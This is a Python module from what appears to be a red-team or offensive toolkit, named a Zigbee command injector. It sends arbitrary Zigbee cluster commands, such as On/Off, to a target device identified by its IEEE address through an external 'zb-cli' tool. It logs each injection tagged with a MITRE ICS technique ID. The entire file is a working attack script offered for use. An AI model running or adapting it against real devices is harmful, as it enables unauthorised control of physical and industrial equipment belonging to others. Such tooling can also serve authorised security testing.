# modules/attacks/zigbee_command_injector.py

import subprocess
import argparse
import time
import json
import os
from datetime import datetime

LOG_PATH = "results/zigbee_command_log.json"
MITRE_TTP = "T0829"

def log_zigbee(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def inject_command(iface, ieee, cluster, command_id):
    try:
        cmd = [
            "zb-cli",
            "--interface", iface,
            "--ieee", ieee,
            "--cluster", cluster,
            "--cmdid", command_id
        ]
        subprocess.run(cmd, check=True, timeout=10)
        log_zigbee({
            "timestamp": datetime.utcnow().isoformat(),
            "interface": iface,
            "target_ieee": ieee,
            "cluster": cluster,
            "command_id": command_id,
            "success": True,
            "ttp": MITRE_TTP
        })
        return True
    except Exception:
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zigbee Command Injector")
    parser.add_argument("--iface", required=True, help="Zigbee interface (e.g., zb0)")
    parser.add_argument("--ieee", required=True, help="Target IEEE address")
    parser.add_argument("--cluster", required=True, help="Cluster ID (e.g., 0x0006 for On/Off)")
    parser.add_argument("--cmdid", required=True, help="Command ID (e.g., 0x01 for ON)")
    args = parser.parse_args()

    if inject_command(args.iface, args.ieee, args.cluster, args.cmdid):
        print("[+] Zigbee command injected")
    else:
        print("[!] Injection failed")
